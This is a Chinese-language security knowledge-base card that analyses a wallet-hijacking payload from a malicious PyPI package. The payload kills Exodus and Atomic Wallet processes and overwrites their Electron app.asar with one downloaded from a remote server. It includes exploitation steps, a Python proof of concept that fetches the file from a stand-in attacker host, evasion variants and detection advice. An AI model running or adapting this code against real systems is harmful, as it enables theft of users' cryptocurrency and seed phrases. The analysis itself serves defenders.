---
id: cloud-cicd-electron-wallet-app-asar-replace-hijack
title: 数字钱包 Electron 客户端 app.asar 替换劫持：结束进程后用恶意 app.asar 覆盖 resources 目录
type: scenario
domain: cloud
path: cloud/ci-cd
technique: electron-app-asar-replace-wallet-hijack
tags:
- supply-chain
- electron
- app-asar
- wallet
- exodus
- atomic-wallet
- hijack
- windows
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V451
  verified_at: '2026-11-10T01:34:51+08:00'
  notes: 已对照原文与25/25图片核对：图25 inject()/inject_atomic() 定位 %LOCALAPPDATA%\exodus 下 app-* 与 Programs\atomic、taskkill /im /t /f、下载 funcaptcha.ru/app.asar 与 funcaptcha.ru/atomic/app.asar 覆盖 resources/app.asar 均一致；重试循环 for i in range(10) 仅见于 exodus 分支，卡中已按原文描述（Atomic 分支无重试）。dedup 候选均为 Electron 其他场景，非同链重复。原文未给受影响版本，affected_versions 置空正确。无 sources/source_url。未验证点：恶意 asar 内容与钱包劫持效果未实测。
url: /docs/cloud/ci-cd/cloud-cicd-electron-wallet-app-asar-replace-hijack/
draft: false
kb_aliases:
- app.asar 替换
- Electron 应用劫持
- Exodus 钱包劫持
- Atomic Wallet 劫持
- 数字钱包供应链投毒
---

## 一句话结论

恶意 PyPI 包的最终载荷会在 Windows 上定位 Exodus 与 Atomic Wallet 桌面客户端的安装目录，从攻击者服务器下载预先制作的恶意 `app.asar`，先 `taskkill` 结束钱包进程，再用它覆盖各版本应用目录下的 `resources/app.asar`；钱包下次启动时加载的即是攻击者的界面与业务代码，从而在钱包进程内窃取或诱导转移资产。

## 原理

- **Electron 应用把代码打包在 app.asar**：Electron 客户端启动时默认从安装目录 `resources/app.asar` 读取主进程与渲染进程代码。asar 只是归档格式，不做签名校验；只要文件被替换，应用就会执行其中的代码，且进程名、窗口标题、图标都仍是合法钱包，用户难以察觉。
- **覆盖前先结束进程**：Windows 对正在运行程序的文件句柄可能阻止写入，代码先 `taskkill /im exodus.exe /t /f`（Atomic Wallet 为 `Atomic Wallet.exe`）终止进程树，再写入文件，确保覆盖成功。
- **定位多版本目录**：Exodus 使用 `%LOCALAPPDATA%\exodus`，目录内以 `app-` 前缀区分不同版本；攻击者遍历该目录并对每个 `app-*/resources/app.asar` 写入同一份恶意文件，避免版本升级后只劫持旧目录。Atomic Wallet 路径为 `%LOCALAPPDATA%\Programs\atomic`，直接覆盖其 `resources/app.asar`。
- **远程下发便于更新**：恶意 asar 从 `funcaptcha.ru/app.asar`、`funcaptcha.ru/atomic/app.asar` 下载，攻击者可随时替换为新的窃密逻辑或钓鱼界面，无需重新投递初始包。
- **重试与容错**：外层 `for i in range(10)` 重试 `inject()`，单次失败（进程未退出、文件占用、目录不存在）会在下一轮再试，提高劫持成功率。
- **为什么有效**：本地文件完整性不受操作系统保护；钱包客户端通常没有启动时自校验；用户信任已安装的钱包程序，输入助记词/密码时不会怀疑界面已被替换。

## 触发条件

- 受害主机为 Windows，且已安装 Exodus 或 Atomic Wallet 桌面客户端；
- 恶意包/木马已以当前用户权限执行（本卡是投递链的最终阶段）；
- 当前用户对 `%LOCALAPPDATA%` 下钱包目录有写权限（安装目录位于用户配置目录，通常可写）；
- 钱包进程可被结束，且主机可下载攻击者的 asar 文件。

## 利用步骤

1. 制作恶意 `app.asar`：在合法钱包前端/主进程代码中植入凭据窃取、转账地址替换或钓鱼界面逻辑，重新打包；
2. 投递并执行劫持脚本（通常由恶意 PyPI 包或窃密木马释放）；
3. 脚本检查 `%LOCALAPPDATA%\exodus` 是否存在，枚举 `app-*` 目录；Atomic Wallet 检查 `%LOCALAPPDATA%\Programs\atomic`；
4. 下载对应恶意 asar 到内存；
5. `taskkill /im <钱包进程> /t /f` 结束进程；
6. 覆盖每个版本目录下的 `resources/app.asar`；
7. 用户下次启动钱包时加载恶意代码，凭据/助记词/私钥或交易内容被窃取或篡改。

## PoC

逻辑示意（占位地址与临时目录，不对真实钱包执行）：

```python
import os, subprocess
from urllib.request import Request, urlopen

def inject():
    proc = "exodus.exe"
    local = os.getenv("localappdata")
    path = f"{local}/exodus"
    if not os.path.exists(path):
        return
    apps = [f for f in os.listdir(path) if "app-" in f]
    req = Request("hxxp://attacker.example/app.asar",
                  headers={"User-Agent": "Mozilla/5.0"})
    data = urlopen(req).read()
    subprocess.Popen(f"taskkill /im {proc} /t /f", shell=True)
    for app in apps:
        target = f"{path}/{app}/resources/app.asar"
        try:
            with open(target, "wb") as f:
                f.write(data)
        except Exception:
            pass

for _ in range(10):
    try:
        inject()
        break
    except Exception:
        pass
```

验证（安全 demo）：在临时目录构造 `fake-wallet/app-1.0.0/resources/app.asar`，把下载地址指向本地文件副本，可验证覆盖逻辑；不要对真实钱包运行。

## 变体与关联

- 变体：可替换 `resources/app` 目录、`app.asar.unpacked`、`resources.pak` 或自动更新程序；也可篡改 `package.json` 加载外部脚本。
- 变体：不替换文件而是注入 Electron 调试端口、`--inspect`/`--remote-debugging-port` 参数或 `NODE_OPTIONS` 环境变量。
- 关联：本卡载荷来自 PyPI 投毒的后续阶段，见 [[cloud-cicd-pypi-fernet-encrypted-staged-loader]]；浏览器凭据收集同属该窃密链。
- 边界：钱包安装到受保护目录且当前用户无写权限、进程受 EDR 保护、或钱包启用代码签名/完整性校验时失败。

## 检测与防御

- 检测：钱包进程被异常 `taskkill`；非更新程序写入 `%LOCALAPPDATA%\exodus\app-*\resources\app.asar` 或 `%LOCALAPPDATA%\Programs\atomic\resources\app.asar`。
- 检测：`app.asar` 哈希与官方发行版不一致；钱包启动后出现异常外联或非官方更新域名。
- 加固：钱包客户端安装后记录 `app.asar` 哈希并定期校验；EDR 监控对钱包目录的写入与进程终止；启用应用签名/完整性校验；从官方渠道更新。
- 响应：结束钱包、恢复官方安装包、离线环境转移资产到新钱包并更换助记词，排查主机其他窃密组件。
